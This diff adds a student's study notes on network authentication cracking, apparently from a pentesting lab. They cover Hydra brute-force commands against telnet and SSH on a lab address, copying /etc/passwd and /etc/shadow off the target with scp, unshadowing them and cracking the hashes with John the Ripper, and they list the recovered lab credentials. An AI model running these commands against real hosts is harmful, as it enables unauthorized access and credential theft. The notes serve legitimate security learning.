@@ -1,0 +1,81 @@
+Network Attacks 
+
+	- Authentication Cracking
+	
+		- key difference between John the ripper and THC hydra
+			
+			***SIDENOTE***
+			-John is offline = zip files and hashes that have been downloaded
+			-hydra is online = enumaration of ftp passwords
+
+		- Brute Force vs Dictionary Attacks 
+
+			- bruteforce will focus on wordlists 
+			- dictionary will have lists of commonly used passwords 
+
+		- Weak and Default Creds
+
+			- network auth cracking relies entirely on dictionary attacks
+			- default usernames and passwords 
+
+			- list of common password lists or kali/parrot 
+				- *** install the seclists package from github *** 
+				- apt-get install seclists
+				- /usr/share/seclists
+
+	- Hydra 
+
+		- fast, parallelized, network authentication cracker that supports different protocols 
+
+		- can attack nearly 50 different service types:
+			- cisco auth/ftp/http/imap/rdp/smb/ssh/telnet 
+			
+			- syntax: 
+				# hydra -L users.txt -P pass.txt <service://server> <options> 
+				
+				- -L = login with file ex. users.txt 
+				- -l = login with actual user name 
+
+			- example syntax of telnet server 
+			
+				# hydra -L users.txt -P pass.txt telnet://target.server 
+
+			# creds sysadmin:secret telnet 
+
+			# creds root:123abc ssh 
+
+		Syntax for Telnet: : 
+
+			sudo hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-10.txt telnet://192.168.99.22 
+
+		Syntax for Ssh: 
+
+			sudo hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ssh://192.168.99.22
+
+
+
+	-Exploitation
+
+		- login into ssh server with 
+
+			- root@192.168.99.22 and verify the location of the /etc/passwd & /etc/shadow
+
+		- now on local machine run to download
+			
+			- scp root@192.168.99.22:/etc/passwd ./path/of/your/choosing
+
+		- next unshadow the passwords -> create a new file for john the ripper to read  
+
+			- unshadow ./passwd ./shadow > ready_to_crack
+
+	- Finally run John The Ripper -> john will automatically detect the hashes with this command
+
+		- john ready_to_crack
+
+
+
+	- Cracked creds: 
+
+		admin:nguyen
+
+		
